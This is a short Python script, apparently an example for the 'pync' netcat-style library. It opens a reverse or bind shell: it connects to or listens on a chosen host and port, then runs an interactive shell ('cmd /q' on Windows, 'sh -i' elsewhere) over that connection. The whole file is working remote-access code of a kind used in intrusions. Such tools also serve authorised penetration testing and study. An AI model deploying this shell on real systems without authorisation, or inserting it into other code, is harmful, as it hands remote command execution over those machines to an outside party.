# -*- coding: utf-8 -*-
'''
A simple reverse or bind shell using pync.
'''

import argparse
import platform

import pync


def main():
    parser = argparse.ArgumentParser('shell.py',
            formatter_class=argparse.RawTextHelpFormatter,
            description=__doc__,
    )
    parser.add_argument('host',
            help='Hostname or IP to connect to',
            metavar='HOST',
            nargs='?',
            default='',
    )
    parser.add_argument('port',
            help='Port number to connect to',
            metavar='PORT',
            type=int,
    )
    parser.add_argument('--listen', '-l',
            help='Listen mode, for inbound connects',
            action='store_true',
    )
    args = parser.parse_args()

    if platform.system() == 'Windows':
        command = 'cmd /q'
    else:
        command = "PS1='$ ' sh -i"

    mode = pync.connect
    if args.listen:
        mode = pync.listen

    with mode(args.host, args.port) as conn:
        conn.execute(command)


if __name__ == '__main__':
    main()

